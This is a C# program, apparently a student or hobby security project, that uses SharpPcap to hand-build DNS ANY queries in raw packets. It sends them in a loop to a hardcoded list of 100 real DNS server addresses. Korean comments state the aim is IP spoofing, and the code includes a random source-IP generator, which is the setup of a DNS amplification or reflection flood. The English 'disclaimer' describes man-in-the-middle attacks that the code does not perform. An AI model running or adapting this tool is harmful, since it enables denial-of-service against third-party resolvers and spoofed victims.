using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SharpPcap;
/*
 * IP Spoofing을 하기 위해 Sharppcap 라이브러리를 사용하여 Raw Socket을 구성한다.
 * Sharppcap에서는 기본적으로 Ethernet / TCP / UDP 를 함수로 재구성하여 작성하였기 때문에 옵션값만 
 * 입력하면 자동으로 헤더값과 체크섬이 생성된다.
 * 하지만, DNS는 어플리케이션 계층으로 UDP의 상위 계층이다. 
 * DNS는 상위 계층이므로 Sharppcap에서 제공하는 함수가 존재하지않으므로 직접 구성해야한다.
 * 구성할때 필요한 점은 구조체로 DNS의 헤더를 구성하고 기존의 하위계층과 호환되어야한다.
 * DNS 구조체는 두개로 구성되고 중간은 가변적길이의 도메인으로 구성된다.
 * 처음 DNS 구조체는 헤더의 값으로 
 * 
 * 
 * 
 */


 namespace dns_project
 {
 	class Program
 	{
 		public struct DNS_Query_Struct_option
 		{
 			public ushort DNS_Type;
 			public ushort DNS_Class;
 			public DNS_Query_Struct_option(ushort DNS_Type, ushort DNS_Class)
 			{
 				this.DNS_Type = DNS_Type;
 				this.DNS_Class = DNS_Class;
 			}
 		}
 		public struct DNS_Query_Struct
 		{
 			public ushort DNS_Transaction_ID;
 			public ushort DNS_Flag_Type;
 			public ushort DNS_Questions;
 			public ushort DNS_Answer_RRs;
 			public ushort DNS_Authority_RRs;
 			public ushort DNS_Additional_RRs;
 			public DNS_Query_Struct(ushort DNS_Transaction_ID, ushort DNS_Flag_Type, ushort DNS_Questions, ushort DNS_Answer_RRs, ushort DNS_Authority_RRs, ushort DNS_Additional_RRs)
 			{
 				this.DNS_Transaction_ID = DNS_Transaction_ID;
 				this.DNS_Flag_Type = DNS_Flag_Type;
 				this.DNS_Questions = DNS_Questions;
 				this.DNS_Answer_RRs = DNS_Answer_RRs;
 				this.DNS_Authority_RRs = DNS_Authority_RRs;
 				this.DNS_Additional_RRs = DNS_Additional_RRs;
 			}

 		}
 		static void Main(string[] args)
 		{
            Console.WriteLine();
            Console.WriteLine("############################ DNS C# Version ############################\r\n");
            Console.WriteLine("############################ Author: HyojongKim #####################################\r\n");
            Console.WriteLine("############################ Version: 1.1 #####################################\r\n");
            Console.WriteLine();
            Console.WriteLine("####################################### DISCLAIMER ########################################");
            Console.WriteLine("The user's computer usually uses URL addresses that consist of easy-to-use characters instead of IP addresses used by the computer. However, since the computer cannot recognize the URL address immediately, when it is entered by the user, it sends the query using UDP protocol to the address of the registered domain name system.");
            Console.WriteLine("an attack using a middleman attack.In the event of a middleman attack, the contents of the query sent by the user's computer are modified and sent to the domain name system server, the domain name system server sends the answer to the changed query to the user's computer, and the user's computer connects using the IP address listed in the query. At this time, the query may be accessed unintentionally because it is not already the original value due to an intermediary attack.");
            Console.WriteLine("Attack when the domain name system address stored on the user's computer is modulated If the IP address of the domain name system registered on the user's computer is already changed due to another factor, it is possible that the user's computer will be connected to an unintended location, even if the user's computer sends a proper query to the server already designated by the attacker.");
            Console.WriteLine();
            var devices = CaptureDeviceList.Instance;
 			int i = 0;
 			foreach (var dev in devices)
 			{
 				Console.WriteLine("{0}) {1} {2}", i, dev.Name, dev.Description);
 				i++;
 			}
 			Console.WriteLine();
 			Console.Write("-- Please choose a device to capture: ");
 			i = int.Parse(Console.ReadLine());

 			var device = devices[i];
 			int readTimeoutMilliseconds = 1000;
 			device.Open(DeviceMode.Promiscuous, readTimeoutMilliseconds);

 			string[] dns_ip_list = { 
 				"211.110.10.36",
 				"112.216.175.94", 
 				"210.100.192.2", 
 				"203.236.20.11", 
 				"112.171.175.135",
 				"211.233.58.67", 
 				"121.180.117.234", 
 				"59.18.177.149", 
 				"218.232.108.149", 
 				"222.122.21.4", 
 				"118.41.190.182", 
 				"222.122.21.3", 
 				"211.245.21.86",
 				"222.122.229.64", 
 				"220.68.245.69", 
 				"121.78.93.25",  
 				"210.178.36.2",
 				"59.10.116.10", 
 				"211.195.214.205", 
 				"211.49.99.81", 
 				"112.216.19.69",
 				"61.42.11.129", 
 				"14.63.217.126", 
 				"222.122.229.65", 
 				"210.96.167.33", 
 				"119.204.242.171", 
 				"211.105.7.5", 
 				"112.216.19.68", 
 				"220.120.221.17",
 				"203.242.43.2", 
 				"168.126.90.189", 
 				"211.239.124.54",  
 				"175.199.11.188", 
 				"106.240.228.50", 
 				"222.236.44.15",  
 				"121.157.116.150",
 				"210.96.167.2", 
 				"220.80.108.34", 
 				"222.112.197.155", 
 				"118.128.205.4",
 				"124.137.207.115", 
 				"125.130.139.108", 
 				"112.168.210.109", 
 				"183.108.12.169", 
 				"183.104.61.115", 
 				"121.125.71.213", 
 				"221.151.128.26", 
 				"1.249.207.225",
 				"218.145.31.132", 
 				"211.171.15.102", 
 				"223.130.96.120",
 				"218.145.31.205",
 				"211.179.185.233", 
 				"221.132.82.66", 
 				"183.104.61.35",
 				"218.145.31.229",
 				"219.253.51.4", 
 				"27.101.139.155", 
 				"61.111.254.243",
 				"218.145.31.139",
 				"121.55.124.140", 
 				"222.122.118.17", 
 				"115.23.196.65",
 				"119.205.213.34",
 				"121.191.82.15", 
 				"220.85.11.66", 
 				"211.37.93.71",
 				"218.145.31.223",
 				"222.231.33.197", 
 				"211.115.81.152", 
 				"175.200.96.71",
 				"221.138.17.158",
 				"211.191.174.5", 
 				"218.38.58.228", 
 				"203.238.187.73",
 				"221.138.17.154",
 				"203.247.29.2", 
 				"221.138.17.152", 
 				"220.93.5.212",
 				"211.219.83.226",
 				"1.254.8.133", 
 				"121.174.236.100", 
 				"175.208.42.132",
 				"218.38.58.185",
 				"121.156.104.182", 
 				"27.101.44.5", 
 				"118.38.9.207",
 				"121.128.168.4",
 				"121.156.104.183", 
 				"119.199.97.96", 
 				"61.97.13.38",
 				"61.97.13.32",
 				"106.244.201.68", 
 				"220.85.238.131", 
 				"61.84.54.11",
 				"119.204.169.74",
 				"112.161.9.158", 
 				"116.125.119.2", 
 				"203.254.128.11",
 				"211.252.106.130" };

 				for (i = 0; i < 100; i++)
 				{

 				DNS_Query_Struct DNS = new DNS_Query_Struct();

                DNS.DNS_Transaction_ID = Convert.ToUInt16(1 << 8); //0x005b;//
                DNS.DNS_Flag_Type = Convert.ToUInt16(16 << 8);
                DNS.DNS_Questions = Convert.ToUInt16(1 << 8);
                DNS.DNS_Answer_RRs = 0;
                DNS.DNS_Authority_RRs = 0;
                DNS.DNS_Additional_RRs = 0;

                byte[] DNS_Array = StructureToByte(DNS);
                //byte[] result = GetNameConvert("www.google.com");
                byte[] result = GetNameConvert("pickmekorea.com");

                DNS_Query_Struct_option DNS_option = new DNS_Query_Struct_option();

                // DNS_option.DNS_Type = Convert.ToUInt16(16 << 8);
                DNS_option.DNS_Type = 255 << 8;//Convert.ToUInt16(255); //16 << 8
                DNS_option.DNS_Class = Convert.ToUInt16(1 << 8);

                byte[] DNS_option_array = StructureToByte(DNS_option);
                byte[] arrD = new byte[DNS_Array.Length + result.Length];
                Array.Copy(DNS_Array, 0, arrD, 0, DNS_Array.Length);
                Array.Copy(result, 0, arrD, DNS_Array.Length, result.Length);
                byte[] arrC = new byte[arrD.Length + DNS_option_array.Length];
                Array.Copy(arrD, 0, arrC, 0, arrD.Length);
                Array.Copy(DNS_option_array, 0, arrC, arrD.Length, DNS_option_array.Length);

                var ethernetPacket = new PacketDotNet.EthernetPacket(
                    PhysicalAddress.Parse("04-D4-C4-90-68-E1"), 
                    PhysicalAddress.Parse("00-08-9F-86-96-30"), 
                    PacketDotNet.EthernetType.IPv4);
                // var ipv4 = new PacketDotNet.IPv4Packet(IPAddress.Parse(rand_source_ip()), IPAddress.Parse("8.8.8.8"));
                var ipv4 = new PacketDotNet.IPv4Packet(IPAddress.Parse("192.168.0.2"), IPAddress.Parse(dns_ip_list[i].ToString()));
                var udp = new PacketDotNet.UdpPacket(Convert.ToUInt16(rand_port()), Convert.ToUInt16("53"));
                // var udp = new PacketDotNet.UdpPacket(Convert.ToUInt16(51430), Convert.ToUInt16("53"));

                udp.PayloadData = arrC;
                udp.Checksum = 0;

                ipv4.Id = 32857;
                ipv4.TimeToLive = 56;
                ipv4.PayloadPacket = udp;
                ipv4.Checksum = ipv4.CalculateIPChecksum();

                ethernetPacket.PayloadPacket = ipv4;

                Console.WriteLine(dns_ip_list[i].ToString() + "-" + i.ToString());

                device.SendPacket(ethernetPacket);

                Thread.Sleep(1000);
            }

        }
        //-------------첫번째와 두번째 문자열에 대한 개수 확인 -----
        //기본 URL은 .이 두개의 특징을 지님
        //만약 URL에 .이 여러개일 경우 , 함수를 수정해야됨
        public static byte[] GetNameConvert(String str)
        {
        	int first = 0;
        	int first_str, middle_str, last_str;
        	first_str = middle_str = last_str = 0;
        	String att = str;
        	byte[] result = new byte[att.Length + 2];

            /*
             * 문자열을 배열로 변경하는 것은 문자열을 하나씩 검색하여 Query의 조건에 맞게 변경해야함
             * 
             * Query의 조건은 예시로 www.naver.com 일때, 3www5naver3com 으로 뒤에 오는 문자의 개수를 구분자의 앞까지 계산하여 추가하는것
             * 
             * 
             */
            char[] a = att.ToCharArray(0, att.Length); //함수에 입력받은 문자열(url)을 char형 배열로 변환

            for (int o = 0; o < a.Length; o++) //변환된 배열의 길이 만큼 반복문 시작
            {
                if (a[o].Equals('.')) //만약 배열의 값이 .과 일치하면 
                {
                    if (first == 0) //처음 .을 발견하였을때,
                    {
                    	first_str = o + 1;
                    	result[0] = Convert.ToByte(o);
                    	first++;
                    }
                    else //두번째 .을 발견하였을때
                    {
                    	middle_str = o - first_str;
                    	result[o + 1] = Convert.ToByte(middle_str);

                    }
                }
                else
                {
                	result[o + 1] = Convert.ToByte(a[o]);
                }

            }

            char[] reverse = att.ToCharArray().Reverse().ToArray();

            for (int k = 0; k < reverse.Length; k++)
            {
            	if (reverse[k].Equals('.'))
            	{
            		last_str = k;
            		break;
            	}
            }

            for (int f = 0; f < result.Length; f++)
            {
            	if (result[f] == middle_str)
            	{
            		result[f] = Convert.ToByte(last_str);
            	}
            	if (result[f] == 0)
            	{
            		result[f] = Convert.ToByte(middle_str);
            	}

            }
            /*
            for (int f = 0; f < result.Length; f++)
            {
                Console.WriteLine("{0} -> {1}", Convert.ToChar(result[f]), result[f]);
                }*/
                result[result.Length - 1] = 0;

                return result;
            }

        // 구조체를 byte 배열로
        public static String Gen_StringData(byte[] Targer) // 화면 출력시 필요한 함수  
        {
        	StringBuilder SB = new StringBuilder();
        	foreach (byte Temp in Targer)
        	{
        		if (Temp < 0x10)
        		SB.Append(String.Format("0{0:X}", Temp));
        		else
        		SB.Append(String.Format("{0:X}", Temp));
        	}
        	return SB.ToString();
        }

        public static byte[] StructureToByte(object obj)
        {
            int datasize = Marshal.SizeOf(obj);//((PACKET_DATA)obj).TotalBytes; // 구조체에 할당된 메모리의 크기를 구한다.
            IntPtr buff = Marshal.AllocHGlobal(datasize); // 비관리 메모리 영역에 구조체 크기만큼의 메모리를 할당한다.
            Marshal.StructureToPtr(obj, buff, false); // 할당된 구조체 객체의 주소를 구한다.
            byte[] data = new byte[datasize]; // 구조체가 복사될 배열
            Marshal.Copy(buff, data, 0, datasize); // 구조체 객체를 배열에 복사
            Marshal.FreeHGlobal(buff); // 비관리 메모리 영역에 할당했던 메모리를 해제함
            return data; // 배열을 리턴
        }


        public static string rand_port()
        {
        	Random r = new Random();
        	int tmp = 0;
        	for (int i = 0; i < 1000; i++)
        	{
        		tmp = r.Next(1, 65535);
        	}

        	return tmp.ToString();
        }

        public static string rand_source_ip()
        {
        	int i;
        	Random r = new Random();
        	int x = 0;
        	int[] ip_array = new int[4];
        	String re_ip = "null";
        	x = rand_array(10);
        	int y = 0;
        	for (i = 0; i < x; i++)
        	{
        		ip_array[y] = r.Next(1, 254);
        		if (y == 3)
        		{
        			break;
        		}
        		y++;
        	}
        	y = 0;
        	re_ip = ip_array[0].ToString() + "." + ip_array[1].ToString() + "." + ip_array[2].ToString() + "." + ip_array[3].ToString();
        	return re_ip;
        }

        public static int rand_array(int k)
        {
        	Random r = new Random();
        	int x = 0;
        	for (int i = 0; i < k; i++)
        	{
        		x = r.Next(1, 1000);
        	}

        	return x;

        }
    }
}
